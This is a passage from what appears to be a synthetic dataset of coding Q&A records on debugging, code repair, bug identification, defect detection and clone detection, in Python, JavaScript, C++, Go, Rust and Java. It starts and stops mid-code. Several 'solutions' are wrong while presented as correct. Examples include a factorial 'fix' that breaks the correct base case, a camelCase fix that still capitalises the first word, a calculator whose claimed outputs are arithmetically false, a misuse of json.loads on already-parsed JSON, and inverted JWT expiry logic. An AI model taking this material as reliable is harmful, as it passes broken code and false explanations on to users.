'your-client-id'\nOAUTH2_CLIENT_SECRET = 'your-client-secret'\nOAUTH2_TOKEN_URL = 'http://localhost:5001/oauth2/token'\n\n# Generate a JWT\ndef generate_jwt(expiration_time):\n    payload = {'exp': expiration_time}\n    return jwt.encode(payload, JWT_SECRET_KEY, algorithm='HS256').decode('utf-8')\n\n# Verify and decode a JWT\ndef verify_jwt(token, expiration_threshold=60):\n    try:\n        payload = jwt.decode(token, JWT_SECRET_KEY, algorithms=['HS256'])\n        if payload['exp'] - time.time() > expiration_threshold:\n            return payload\n        else:\n            return None\n    except jwt.exceptions.DecodeError:\n        return None\n\n@app.route('/api', methods=['GET'])\ndef secure_api():\n    # Validate client credentials\n    client = BackendApplicationClient(client_id=OAUTH2_CLIENT_ID)\n    oauth = OAuth2Session(client=client)\n    token = oauth.fetch_token(token_url=OAUTH2_TOKEN_URL, client_id=OAUTH2_CLIENT_ID, client_secret=OAUTH2_CLIENT_SECRET)\n\n    # Validate and decode the access token\n    access_token = token['access_token']\n    user_data = verify_jwt(access_token)\n    if user_data:\n        # Access granted, process API request\n        return jsonify({'message': 'Access granted, API data processed successfully.', 'user_data': user_data})\n    else:\n        return make_response(jsonify({'error': 'Invalid or expired access token.'}), 401)\n\nif __name__ == '__main__':\n    app.run(debug=True)\n```\nIn both solutions, the examples are in Python using the Flask framework to create the API endpoints. The first solution demonstrates a simple key management system with rotating access tokens using JWT, rate limiting, and IP whitelisting. The second solution showcases a more advanced approach using OAuth 2.0 with the client credentials grant type for secure API access and token revocation capabilities."}, {"L2_TASK": "Debugging & troubleshooting", "L3_TASK": "Code repair", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: A Python program is intended to calculate the factorial of a number, but it returns incorrect results for some inputs. Identify the issue and provide a corrected version of the code.\n\nConcept: Debugging & Troubleshooting (Code Repair)\n\n```python\ndef faulty_factorial(n):\n    if n == 0:\n        return 1\n    else:\n        return n * faulty_factorial(n-2)\n\n# Incorrect result for 5! (Should be 120, but returns 20)\nprint(faulty_factorial(5))\n```\n\nSolution:\nThe problem lies in the recursion call where the function is calling itself with `n-2` instead of `n-1`, causing it to miss odd-numbered factors. Here's the corrected code:\n\n```python\ndef corrected_factorial(n):\n    if n == 0:\n        return 1\n    else:\n        return n * corrected_factorial(n-1)\n\n# Correct result for 5! (120)\nprint(corrected_factorial(5))\n```\n\nQuestion 2:\nProblem: A JavaScript function is supposed to convert a string to camelCase, but it's not working as expected. The function is concatenating the strings without spaces removed and uppercase letters.\n\nConcept: Debugging & Troubleshooting (Code Repair)\n\n```javascript\nfunction faulty_toCamelCase(str) {\n    return str.toLowerCase().split('').join('');\n}\n\n// Incorrect result: \"hello world\" (Should be \"helloWorld\")\nconsole.log(faulty_toCamelCase(\"hello world\"));\n```\n\nSolution:\nThe function is missing the necessary steps to remove spaces and capitalize the first letter of each word after the first. Here's the corrected code:\n\n```javascript\nfunction corrected_toCamelCase(str) {\n    return str.toLowerCase()\n               .split(' ')\n               .map(word => word.charAt(0).toUpperCase() + word.slice(1))\n               .join('');\n}\n\n// Correct result: \"helloWorld\"\nconsole.log(corrected_toCamelCase(\"hello world\"));\n```"}, {"L2_TASK": "Debugging & troubleshooting", "L3_TASK": "Code repair", "Complexity_Level": "extremely difficult", "Response": "Question 1: A complex multithreaded application in C++ is experiencing race conditions and deadlocks, causing unpredictable behavior. The application uses shared resources, mutexes, and condition variables for synchronization. The task is to identify and fix the race condition while ensuring thread safety and preserving the application's intended functionality.\n\n**Concept**: Concurrency, Thread Synchronization\n\n```cpp\n#include <iostream>\n#include <mutex>\n#include <thread>\n#include <vector>\n#include <condition_variable>\n\nstd::mutex mtx;\nstd::condition_variable cv;\nbool ready = false;\nbool processed = false;\n\nvoid worker_thread(int id, std::vector<int>& data) {\n    std::unique_lock<std::mutex> lock(mtx);\n    while (!ready) {\n        cv.wait(lock);\n    }\n    // Critical section: data processing\n    for (int i = 0; i < data.size(); ++i) {\n        if (data[i] % id == 0) {\n            data[i] += id;\n        }\n    }\n    processed = true;\n    cv.notify_one();\n}\n\nint main() {\n    std::vector<int> data = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10};\n    std::vector<std::thread> threads;\n    threads.emplace_back(worker_thread, 1, std::ref(data));\n    threads.emplace_back(worker_thread, 2, std::ref(data));\n\n    {\n        std::unique_lock<std::mutex> lock(mtx);\n        ready = true;\n        cv.notify_all();\n    }\n\n    for (auto& t : threads) {\n        t.join();\n    }\n\n    for (int val : data) {\n        std::cout << val << \" \";\n    }\n\n    return 0;\n}\n```\n\nSolution: To fix the race condition, you can use a separate flag for each thread to indicate which thread has finished processing. Also, use a shared state to control when the main thread should wait for all workers to finish.\n\n```cpp\n#include <iostream>\n#include <mutex>\n#include <thread>\n#include <vector>\n#include <condition_variable>\n\nstd::mutex mtx;\nstd::condition_variable cv;\nbool ready = false;\nbool processed[2] = {false, false}; // New: one flag per thread\nint processed_count = 0;\nbool all_processed = false;\n\nvoid worker_thread(int id, std::vector<int>& data) {\n    std::unique_lock<std::mutex> lock(mtx);\n    while (!ready) {\n        cv.wait(lock);\n    }\n    // Critical section: data processing\n    for (int i = 0; i < data.size(); ++i) {\n        if (data[i] % id == 0) {\n            data[i] += id;\n        }\n    }\n    processed[id - 1] = true; // Update corresponding flag\n    ++processed_count;\n\n    if (processed_count == 2) { // All threads processed\n        all_processed = true;\n        cv.notify_one();\n    }\n}\n\nint main() {\n    std::vector<int> data = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10};\n    std::vector<std::thread> threads;\n    threads.emplace_back(worker_thread, 1, std::ref(data));\n    threads.emplace_back(worker_thread, 2, std::ref(data));\n\n    {\n        std::unique_lock<std::mutex> lock(mtx);\n        ready = true;\n        cv.notify_all();\n    }\n\n    std::unique_lock<std::mutex> lock(mtx);\n    while (!all_processed) {\n        cv.wait(lock);\n    }\n\n    for (auto& t : threads) {\n        t.join();\n    }\n\n    for (int val : data) {\n        std::cout << val << \" \";\n    }\n\n    return 0;\n}\n```\n\nQuestion 2: A large Python project with multiple modules is experiencing a mysterious memory leak. The application reads large datasets, processes them, and stores results in a database. The issue seems to be in the data processing component, but the root cause is not immediately apparent.\n\n**Concept**: Memory Management, Profiling, Heap Analysis\n\n```python\nimport numpy as np\nimport sqlite3\n\ndef process_data(dataset):\n    processed_data = []\n    for chunk in dataset.chunks:  # Assuming dataset has a 'chunks' property\n        temp_array = np.array(chunk) * 2  # Simulated data processing\n        processed_data.append(temp_array)\n    return processed_data\n\ndef store_results(results, db_connection):\n    cursor = db_connection.cursor()\n    for result in results:\n        cursor.execute(\"INSERT INTO processed_data VALUES (?)\", (result,))\n    db_connection.commit()\n\ndef main():\n    dataset = DatasetLoader()  # Assume DatasetLoader loads large data\n    db_connection = sqlite3.connect('results.db')\n    results = process_data(dataset)\n    store_results(results, db_connection)\n    db_connection.close()\n\nif __name__ == \"__main__\":\n    main()\n```\n\nSolution: To identify and fix the memory leak, you can use a memory profiler like `memory_profiler` and analyze the heap with `objgraph`. This example demonstrates how to refactor `process_data` to avoid creating unnecessary in-memory copies.\n\n```python\nimport numpy as np\nimport sqlite3\nfrom memory_profiler import profile  # Install: pip install memory-profiler\nimport objgraph  # Install: pip install objgraph\n\n@profile\ndef process_data(dataset):\n    processed_data = []\n    for chunk in dataset.chunks:\n        temp_array = chunk * 2  # In-place operation if chunk is a numpy array\n        processed_data.append(temp_array)\n    return processed_data\n\ndef store_results(results, db_connection):\n    cursor = db_connection.cursor()\n    for result in results:\n        cursor.execute(\"INSERT INTO processed_data VALUES (?)\", (result,))\n    db_connection.commit()\n\ndef main():\n    dataset = DatasetLoader()\n    db_connection = sqlite3.connect('results.db')\n\n    with profile():\n        results = process_data(dataset)\n    store_results(results, db_connection)\n    db_connection.close()\n\nif __name__ == \"__main__\":\n    main()\n\n# After identifying the leak, use objgraph to analyze the objects:\n# objgraph.show_most_common_types(limit=20)\n# objgraph.show_backrefs([obj], max_depth=20, limit=20)\n# objgraph.show_growth()\n```\n\nIn this case, the issue could be resolved by using in-place operations like `chunk *= 2` instead of creating new arrays with `np.array(chunk) * 2`. Additionally, periodically clearing temporary data structures or using generators instead of lists can help manage memory usage."}, {"L2_TASK": "Debugging & troubleshooting", "L3_TASK": "Bug identification", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: A program is supposed to calculate the factorial of a given number but it produces incorrect results for certain inputs. The problem lies in the recursive implementation of the factorial function.\n\nConcept: Debugging in Python\n\n```python\ndef factorial(n):\n    if n == 0:\n        return 1\n    else:\n        return n * factorial(n - 1)\n\ndef main():\n    num = 5\n    result = factorial(num)\n    print(f\"Factorial of {num} is: {result}\")\n\nif __name__ == \"__main__\":\n    main()\n```\n\nSolution: The issue is that the base case check is incorrect. It should consider `n == 1` as the base case instead of `n == 0`. Here's the corrected code:\n\n```python\ndef factorial(n):\n    if n == 1:\n        return 1\n    else:\n        return n * factorial(n - 1)\n\ndef main():\n    num = 5\n    result = factorial(num)\n    print(f\"Factorial of {num} is: {result}\")\n\nif __name__ == \"__main__\":\n    main()\n```\n\nQuestion 2:\nProblem: A web application is displaying an unexpected layout issue where buttons are overlapping with text inputs on smaller screens. The problem is in the CSS styling.\n\nConcept: Debugging in HTML/CSS\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <style>\n        .container {\n            display: flex;\n            flex-wrap: nowrap;\n        }\n        .button, .input-field {\n            margin: 5px;\n            flex-basis: 100px;\n        }\n    </style>\n</head>\n<body>\n    <div class=\"container\">\n        <input class=\"input-field\" type=\"text\" placeholder=\"Username\">\n        <button class=\"button\">Submit</button>\n    </div>\n</body>\n</html>\n```\n\nSolution: The issue is because `flex-wrap: nowrap;` in the `.container` class prevents the elements from wrapping onto the next line. Removing it allows the elements to wrap as needed on smaller screens.\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <style>\n        .container {\n            display: flex;\n            /* Remove flex-wrap: nowrap; */\n        }\n        .button, .input-field {\n            margin: 5px;\n            flex-basis: 100px;\n        }\n    </style>\n</head>\n<body>\n    <div class=\"container\">\n        <input class=\"input-field\" type=\"text\" placeholder=\"Username\">\n        <button class=\"button\">Submit</button>\n    </div>\n</body>\n</html>\n```"}, {"L2_TASK": "Debugging & troubleshooting", "L3_TASK": "Bug identification", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nIn a large distributed system written in Java, there's an intermittent issue where requests between microservices are getting stuck, causing timeouts. The problem only occurs under high load conditions and is difficult to reproduce. How can you identify the root cause and fix this issue?\n\nConcept: Distributed Systems, Debugging\n\nSolution:\nTo identify the root cause, we can use a combination of monitoring, logging, and distributed tracing to analyze request flow and performance under high load. Here's an example using Java, OpenTelemetry, and Jaeger for tracing:\n\n1. Integrate OpenTelemetry in the microservices to trace requests:\n```java\n// Add the OpenTelemetry dependency\n<dependency>\n    <groupId>io.opentelemetry</groupId>\n    <artifactId>opentelemetry-sdk-extensions-autoconfigure</artifactId>\n    <version>1.14.0</version>\n</dependency>\n\n// Initialize OpenTelemetry in your application\nOpenTelemetry.initGlobal(OpenTelemetry.builder()\n    .addProcessor(new SimpleSpanProcessor(SpanExporter.create(JaegerExporter.builder()\n        .setAgentHost(\"localhost\")\n        .setAgentPort(6831)\n        .build())))\n    .buildTracer());\n```\n1. Add trace IDs and span IDs to incoming and outgoing requests:\n```java\n// Decorate your REST controllers or service methods\n@RequestScope\npublic class MyService {\n    private Tracer tracer = OpenTelemetry.getTracer(\"my-service\");\n\n    public Response handleRequest(Request request) {\n        Span span = tracer.spanBuilder(\"handleRequest\").startSpan();\n        try (Scope scope = span.makeCurrent()) {\n            // Process the request\n            // ...\n\n            // Log the trace information\n            log.info(\"Request processed with traceId={}, spanId={}\", span.getTraceId(), span.getSpanId());\n        } finally {\n            span.end();\n        }\n        return response;\n    }\n}\n```\n1. Reproduce the issue with a load testing tool like JMeter or Locust and monitor Jaeger for traces.\n2. Analyze traces to identify slow or hanging spans. Look for any spans that consistently take longer than expected or have a high number of child spans.\n3. Investigate the identified spans for any potential bottlenecks, such as database queries, external service calls, or resource contention.\n4. Optimize the identified bottlenecks, and if necessary, introduce load balancing, caching, or other performance-improving strategies.\n5. Repeat the load testing and monitoring until the issue is resolved.\n\nQuestion 2:\nIn a C++ application that uses multithreading, there's a bug causing random crashes or data corruption. The issue is difficult to reproduce and isolate due to its sporadic nature. How can you debug and fix this problem?\n\nConcept: Multithreading, Debugging\n\nSolution:\nDebugging multithreaded issues can be challenging. Here's an approach using C++ and tools like `gdb` and `valgrind`:\n\n1. Enable compiler flags for thread safety analysis:\n```bash\ng++ -std=c++11 -O0 -g -fsanitize=thread -lasan your_program.cpp\n```\n2. Reproduce the issue, if possible, under controlled conditions or with a stress testing tool like `stress-ng`.\n3. Use `gdb` to attach to the running process and inspect the threads:\n```bash\ngdb your_program <pid>\ninfo threads\nswitch-to-thread <thread_id>\nbacktrace full\n```\n4. Check for data races or lock contention using `valgrind`:\n```bash\nvalgrind --tool=helgrind your_program\n```\n5. Analyze the output for reports of data races, inconsistent memory accesses, or synchronization issues. For example, look for lines like \"Irregular read of size X at\" or \" probable data race\".\n6. Identify the problematic code sections and review the synchronization mechanisms (mutexes, semaphores, etc.). Ensure each shared resource is properly protected.\n7. Use `std::atomic` for shared variables requiring atomic operations or consider using higher-level synchronization constructs like `std::lock_guard` and `std::mutex::lock/unlock`.\n8. Apply the fixes and re-run the tests. Repeat until the issue is resolved.\n\nNote: In some cases, reproducing the issue might require using custom logging or adding additional debug information to the code. Also, consider using profiling tools like `gprof` or `perf` to identify performance bottlenecks that could be related to threading issues."}, {"L2_TASK": "Debugging & troubleshooting", "L3_TASK": "Code fix suggestions", "Complexity_Level": "medium", "Response": "Problem 1: A Python web application is experiencing unexpected behavior where the data retrieved from an API is not being properly processed. The user reports that the data, which is in JSON format, is not being deserialized and appended to a list as intended.\n\n**Concept**: JSON Parsing\n\n```python\nimport requests\nimport json\n\ndef fetch_and_process_data(url):\n    response = requests.get(url)\n\n    # Problem: Data is not being properly deserialized\n    data = json.loads(response.text)  # Incorrect key usage\n    processed_data = []\n\n    for item in data['items']:\n        processed_data.append(item['name'])\n\n    return processed_data\n\nurl = \"https://api.example.com/data\"\nresult = fetch_and_process_data(url)\nprint(result)\n```\n\nSolution:\n\n```python\nimport requests\nimport json\n\ndef fetch_and_process_data(url):\n    response = requests.get(url)\n\n    # Solution: Check if response was successful and use appropriate key for deserialization\n    if response.status_code == 200:\n        data = json.loads(response.json())  # Correct key usage\n    else:\n        raise Exception(f\"Failed to fetch data. Status code: {response.status_code}\")\n\n    processed_data = []\n\n    for item in data.get('items', []):  # Handle case where 'items' key might not exist\n        processed_data.append(item.get('name', 'N/A'))  # Handle case where 'name' key might not exist\n\n    return processed_data\n\nurl = \"https://api.example.com/data\"\nresult = fetch_and_process_data(url)\nprint(result)\n```\n\nProblem 2: A JavaScript application is displaying incorrect results in a calculation function. The user has identified that the function is not correctly handling negative numbers and decimal points.\n\n**Concept**: Number Handling\n\n```javascript\nfunction calculate(a, b, operation) {\n    a = parseFloat(a);\n    b = parseFloat(b);\n\n    if (isNaN(a) || isNaN(b)) {\n        return \"Invalid input\";\n    }\n\n    switch (operation) {\n        case '+':\n            return a + b;\n        case '-':\n            return a - b;\n        case '*':\n            return a * b;\n        case '/':\n            return a / b;\n        default:\n            return \"Unknown operation\";\n    }\n}\n\nconsole.log(calculate(\"-3.5\", 2, \"*\")); // Incorrectly returns \"-1.4\"\n```\n\nSolution:\n\n```javascript\nfunction calculate(a, b, operation) {\n    a = parseFloat(a);\n    b = parseFloat(b);\n\n    if (isNaN(a) || isNaN(b)) {\n        return \"Invalid input\";\n    }\n\n    // Handle negative numbers and decimal points\n    a = a < 0 ? -Math.abs(a) : Math.abs(a);\n    b = b < 0 ? -Math.abs(b) : Math.abs(b);\n\n    switch (operation) {\n        case '+':\n            return a + b;\n        case '-':\n            return a - b;\n        case '*':\n            return a * b;\n        case '/':\n            return a / b;\n        default:\n            return \"Unknown operation\";\n    }\n}\n\nconsole.log(calculate(\"-3.5\", 2, \"*\")); // Correctly returns \"7\"\n```\n\nIn both solutions, we addressed the medium complexity issues by handling potential errors, such as incorrect keys in JSON parsing, and ensuring proper number handling in JavaScript calculations."}, {"L2_TASK": "Debugging & troubleshooting", "L3_TASK": "Code fix suggestions", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nGiven a complex, asynchronous JavaScript application with a bug causing unexpected race conditions and data corruption in a WebSocket communication layer, provide a detailed diagnosis and a solution to fix the issue.\n\n**Diagnosis:**\nThe issue is rooted in improper handling of WebSocket message dispatching, leading to race conditions between multiple concurrent connections. The message processing logic might be modifying shared resources without proper synchronization, causing data corruption.\n\n**Solution:**\nHere's an example of a corrected version in JavaScript using `async/await`, `Promise.all()`, and locks to ensure correct message handling and resource synchronization:\n\n```javascript\nconst WebSocket = require('ws');\nconst { Lock } = require('async-lock');\n\nconst lock = new Lock();\nconst webSocketServer = new WebSocket.Server({ port: 8080 });\n\nwebSocketServer.on('connection', async (socket) => {\n  socket.on('message', async (message) => {\n    try {\n      // Acquire the lock before processing the message\n      await lock.acquire('message-processing', async () => {\n        // Parse and validate the message\n        const data = JSON.parse(message);\n        if (!isValidData(data)) {\n          throw new Error('Invalid message format');\n        }\n\n        // Simulate asynchronous operations that could cause race conditions\n        await processData(data);\n      });\n    } catch (error) {\n      console.error(`Error processing message: ${error.message}`);\n      socket.send(JSON.stringify({ status: 'error', error: error.message }));\n    } finally {\n      // Release the lock after processing the message\n      lock.release('message-processing');\n    }\n  });\n\n  socket.on('close', () => {\n    console.log('Client disconnected');\n  });\n});\n\nasync function processData(data) {\n  // Complex, potentially async operations with shared resources\n  // ...\n\n  // Simulate async operation\n  await new Promise(resolve => setTimeout(resolve, 1000));\n}\n\nfunction isValidData(data) {\n  // Validate the message's data structure\n  // ...\n\n  return true; // Replace with actual validation result\n}\n```\n\n**Concept: Asynchronous Programming**\n\nQuestion 2:\nIn a Rust program, a concurrency issue is causing data races when multiple threads access a shared resource, leading to inconsistent results. Identify the problem and provide a solution using Rust's ownership and synchronization mechanisms.\n\n**Diagnosis:**\nThe problem is that Rust's ownership and borrowing rules are not being followed when accessing shared resources across multiple threads. This results in data races, where multiple threads read and write to the same memory location simultaneously without proper synchronization.\n\n**Solution:**\nUse the `Arc` (Atomic Reference Counted) and `Mutex` (Mutex) from the `std::sync` module to ensure thread-safe access to shared data:\n\n```rust\nuse std::sync::{Arc, Mutex};\nuse std::thread;\n\nstruct SharedResource {\n    data: Vec<i32>,\n}\n\nfn worker(shared_resource: Arc<Mutex<SharedResource>>, index: usize) {\n    let mut resource_guard = shared_resource.lock().unwrap();\n\n    // Modify shared data in a thread-safe manner\n    resource_guard.data.push(index);\n\n    // Perform complex operations\n    let result = complex_operation(&resource_guard.data);\n    println!(\"Worker {}: Result: {}\", index, result);\n}\n\nfn complex_operation(data: &[i32]) -> i32 {\n    // Perform some complex calculation on the data\n    data.iter().sum()\n}\n\nfn main() {\n    let shared_resource = Arc::new(Mutex::new(SharedResource { data: vec![] }));\n    let threads = (0..5).map(|i| {\n        let shared_resource_cloned = Arc::clone(&shared_resource);\n        thread::spawn(move || worker(shared_resource_cloned, i))\n    });\n\n    for t in threads {\n        t.join().unwrap();\n    }\n}\n```\n\n**Concept: Concurrency (Rust Ownership and Synchronization)**"}, {"L2_TASK": "Debugging & troubleshooting", "L3_TASK": "Defect detection", "Complexity_Level": "medium", "Response": "Question 1:\nMedium Difficulty Problem: You have a Python program that reads data from a CSV file and performs some calculations. However, the program occasionally throws a `KeyError` when trying to access a specific key in a dictionary constructed from the CSV data. You need to detect and handle this defect.\n\nConcept: Exception Handling, CSV Processing\n\nSolution:\n```python\nimport csv\n\ndef read_csv_and_calculate(filename):\n    data = []\n    with open(filename, 'r') as file:\n        reader = csv.DictReader(file)\n        for row in reader:\n            data.append(row)\n\n    for record in data:\n        try:\n            result = record['column_name'] * 10  # Replace 'column_name' with the actual column name\n            print(f\"Result for {record['another_key']}: {result}\")  # Replace 'another_key' with another column name\n        except KeyError:\n            print(f\"Missing data for record ID: {record['ID']}, skipped calculation.\")\n\n# Example usage\nread_csv_and_calculate('input.csv')\n```\nThis code reads a CSV file using `csv.DictReader` and converts each row into a dictionary. It then goes through each record and tries to perform a calculation using a specific key. If a `KeyError` occurs, it catches the exception and prints a message, indicating that the record is skipped due to missing data.\n\nQuestion 2:\nMedium Difficulty Problem: You're building a JavaScript web application that fetches data from an API and displays it on a page. The application sometimes fails to display the data due to a network error or an unexpected response format. Implement a defect detection mechanism to handle these issues.\n\nConcept: Error Handling, Asynchronous Programming, APIs\n\nSolution:\n```javascript\nasync function fetchData(apiUrl) {\n  try {\n    const response = await fetch(apiUrl);\n    if (!response.ok) {\n      throw new Error(`HTTP error! status: ${response.status}`);\n    }\n    const data = await response.json();\n\n    // Assuming the data is an array of objects with 'title' and 'description' keys\n    data.forEach(item => {\n      if (!item.title || !item.description) {\n        throw new Error(`Invalid data format: Missing title or description for item ${item.id}`);\n      }\n      displayData(item);\n    });\n  } catch (error) {\n    alert(`Error fetching data: ${error.message}`);\n  }\n}\n\nfunction displayData(item) {\n  // Code to display data on the web page\n  const container = document.getElementById('data-container');\n  const titleElement = document.createElement('h2');\n  titleElement.textContent = item.title;\n  container.appendChild(titleElement);\n  \n  const descriptionElement = document.createElement('p');\n  descriptionElement.textContent = item.description;\n  container.appendChild(descriptionElement);\n}\n\n// Example usage\nfetchData('https://api.example.com/data')\n  .then(() => console.log('Data fetched and displayed successfully'))\n  .catch(error => console.error('An unexpected error occurred', error));\n```\nThe `fetchData` function fetches data from an API using the `fetch` API. It checks if the response is successful and then parses the JSON data. If any items in the data are missing the 'title' or 'description' keys, an error is thrown. The entire process is wrapped in a `try-catch` block to handle network and data formatting errors. The error messages are displayed to the user using `alert` or logged in the console."}, {"L2_TASK": "Debugging & troubleshooting", "L3_TASK": "Defect detection", "Complexity_Level": "extremely difficult", "Response": "Question 1: Given a complex distributed system involving microservices written in Go and interconnected through REST APIs, a sporadic bug is causing data inconsistencies between services. The bug seems to manifest when multiple requests are processed concurrently, leading to race conditions. Develop a comprehensive strategy and provide example code to identify, isolate, and fix this issue.\n\nSolution:\nConcept: Distributed Tracing, Concurrency Control, Race Conditions\n\nTo debug and fix this issue, we can use a combination of distributed tracing, proper synchronization, and unit testing.\n\n1. Implement Distributed Tracing: Use a tool like Jaeger or Zipkin to trace requests across microservices. This will help visualize request flow and identify where race conditions occur.\n2. Analyze the code: Review the suspect services' code to identify any shared resources or mutable state that might cause race conditions.\n3. Add synchronization: Apply necessary synchronization mechanisms like mutexes or channels to protect shared resources.\n\nExample Go code:\n```go\npackage main\n\nimport (\n\t\"sync\"\n\t\"time\"\n)\n\ntype SharedResource struct {\n\tdata map[string]int\n\tmu   sync.RWMutex\n}\n\nfunc (sr *SharedResource) update(key string, value int) {\n\tsr.mu.Lock()\n\tdefer sr.mu.Unlock()\n\tsr.data[key] = value\n}\n\nfunc (sr *SharedResource) read(key string) int {\n\tsr.mu.RLock()\n\tdefer sr.mu.RUnlock()\n\treturn sr.data[key]\n}\n\nfunc service1(req Request, wg *sync.WaitGroup) {\n\tdefer wg.Done()\n\tsharedResource := &SharedResource{data: make(map[string]int)}\n\t// Simulate concurrent requests\n\tfor i := 0; i < 100; i++ {\n\t\tgo func() {\n\t\t\tsharedResource.update(\"key\", i)\n\t\t\ttime.Sleep(time.Millisecond * 50) // Introduce randomness\n\t\t}()\n\t}\n}\n\nfunc service2(req Request, wg *sync.WaitGroup) {\n\tdefer wg.Done()\n\tsharedResource := &SharedResource{}\n\t// Simulate concurrent reads\n\tfor i := 0; i < 100; i++ {\n\t\tgo func() {\n\t\t\tvalue := sharedResource.read(\"key\")\n\t\t\ttime.Sleep(time.Millisecond * 50) // Introduce randomness\n\t\t\t// Log or validate the value\n\t\t}()\n\t}\n}\n\nfunc main() {\n\tvar wg sync.WaitGroup\n\twg.Add(2)\n\n\tgo service1(Request{}, &wg)\n\tgo service2(Request{}, &wg)\n\n\twg.Wait()\n}\n```\n1. Create Unit Tests: Write concurrent unit tests to reproduce the issue and verify that the fix works.\n\nQuestion 2: In a large Python project using a complex dependency injection (DI) framework, a performance bottleneck has been identified in a specific module. The issue appears only when the application is under high load, making it difficult to debug. Develop a strategy to identify the root cause, optimize the code, and prevent future occurrences.\n\nSolution:\nConcept: Profiling, Dependency Injection, Load Testing\n\n1. Profiling: Use profiling tools like cProfile for Python to identify slow functions during high load execution.\n2. Review Dependency Injection: Analyze the DI configuration to ensure it's not creating unnecessary objects or causing excessive dependencies.\n3. Optimize the code: Implement performance optimizations, such as caching, reducing unnecessary computations, and leveraging built-in functions or libraries.\n4. Load Testing: Use tools like JMeter or Locust to simulate high loads and validate improvements.\n\nExample Python code:\n```python\nimport cProfile\nfrom di_framework import DependencyInjector\n\ndef performance_bottleneckdependency_injector, payload):\n    # Complex business logic with DI\n    obj1 = dependency_injector.get(Service1)\n    obj2 = dependency_injector.get(Service2)\n    result = obj1.process(payload) + obj2.process(payload)\n    return result\n\ndef main():\n    payload = generate_large_payload()\n    dependency_injector = DependencyInjector()\n    \n    # Profiling\n    cProfile.runctx('performance_bottleneck(dependency_injector, payload)', globals(), locals(), filename='profile_results.txt')\n\n    # Load Testing (pseudocode)\n    load_tester.runSimulation(performance_bottleneck, dependency_injector, payload, num_requests=10000)\n\nif __name__ == '__main__':\n    main()\n```\n1. Monitor and Logging: Set up monitoring and logging to track performance metrics in production, enabling faster detection and resolution of future issues."}, {"L2_TASK": "Debugging & troubleshooting", "L3_TASK": "Clone detection", "Complexity_Level": "medium", "Response": "Question 1: Develop a medium complexity tool in Python to identify duplicate code blocks within a given project. The tool should compare all source code files and report any code blocks with a minimum of 80% similarity.\n\nConcept: \"Clone Detection\"\n\nSolution:\n```python\nimport os\nimport difflib\n\ndef read_file(file_path):\n    with open(file_path, 'r') as file:\n        return file.read().splitlines()\n\ndef find_duplicates(project_path, similarity_threshold=0.8):\n    files = [os.path.join(project_path, f) for f in os.listdir(project_path) if f.endswith('.py')]\n    file_contents = {file: read_file(file) for file in files}\n\n    for file1, contents1 in file_contents.items():\n        for file2, contents2 in file_contents.items():\n            if file1 == file2:\n                continue\n\n            blocks1 = split_blocks(contents1)\n            blocks2 = split_blocks(contents2)\n\n            for block1 in blocks1:\n                for block2 in blocks2:\n                    similarity = diff_similarity(block1, block2)\n                    if similarity >= similarity_threshold:\n                        print(f\"Potential duplicate found in {file1} and {file2}:\")\n                        print(f\"Block 1:\")\n                        print('\\n'.join(block1))\n                        print(\"Block 2:\")\n                        print('\\n'.join(block2))\n                        print(f\"Similarity: {similarity * 100}%\\n\")\n\ndef split_blocks(lines):\n    blocks = []\n    current_block = []\n\n    for line in lines:\n        if not line.strip():\n            if current_block:\n                blocks.append(current_block)\n                current_block = []\n        else:\n            current_block.append(line)\n\n    if current_block:\n        blocks.append(current_block)\n\n    return [block for block in blocks if block]\n\ndef diff_similarity(block1, block2):\n    diff = difflib.SequenceMatcher(None, '\\n'.join(block1), '\\n'.join(block2))\n    return diff.ratio()\n\n# Example usage:\nproject_path = '/path/to/your/project'\nfind_duplicates(project_path)\n```\nThis tool parses all `.py` files within the specified project directory, splits the contents into code blocks, and compares them using the `difflib` library in Python. It identifies potential duplicates with at least 80% similarity.\n\nQuestion 2: Write a medium complexity Java program to detect code clones in a set of Java source files. The program should read all `.java` files in a specified directory, compare them, and report any code blocks with a minimum of 80% similarity.\n\nConcept: \"Clone Detection\"\n\nSolution:\n```java\nimport java.io.BufferedReader;\nimport java.io.File;\nimport java.io.FileReader;\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class CodeCloneDetector {\n\n    public static List<String> readFile(String filePath) throws IOException {\n        List<String> lines = new ArrayList<>();\n        try (BufferedReader reader = new BufferedReader(new FileReader(filePath))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                lines.add(line);\n            }\n        }\n        return lines;\n    }\n\n    public static void detectDuplicates(String projectPath, double similarityThreshold) throws IOException {\n        File directory = new File(projectPath);\n        File[] files = directory.listFiles((d, name) -> name.endsWith(\".java\"));\n\n        for (File file1 : files) {\n            for (File file2 : files) {\n                if (file1.equals(file2)) {\n                    continue;\n                }\n\n                List<String> contents1 = readFile(file1.getAbsolutePath());\n                List<String> contents2 = readFile(file2.getAbsolutePath());\n\n                for (List<String> block1 : splitBlocks(contents1)) {\n                    for (List<String> block2 : splitBlocks(contents2)) {\n                        double similarity = diffSimilarity(block1, block2);\n                        if (similarity >= similarityThreshold) {\n                            System.out.printf(\"Potential duplicate found in %s and %s:%n\", file1.getName(), file2.getName());\n                            printBlock(block1);\n                            printBlock(block2);\n                            System.out.printf(\"Similarity: %.0f%%%n%n\", similarity * 100);\n                        }\n                    }\n                }\n            }\n        }\n    }\n\n    private static List<List<String>> splitBlocks(List<String> lines) {\n        List<List<String>> blocks = new ArrayList<>();\n        List<String> currentBlock = new ArrayList<>();\n\n        for (String line : lines) {\n            if (line.trim().isEmpty()) {\n                if (!currentBlock.isEmpty()) {\n                    blocks.add(currentBlock);\n                    currentBlock = new ArrayList<>();\n                }\n            } else {\n                currentBlock.add(line);\n            }\n        }\n\n        if (!currentBlock.isEmpty()) {\n            blocks.add(currentBlock);\n        }\n\n        return blocks;\n    }\n\n    private static double diffSimilarity(List<String> block1, List<String> block2) {\n        return 1.0 - LevenshteinDistance.computeLevenshteinDistance(block1, block2) / 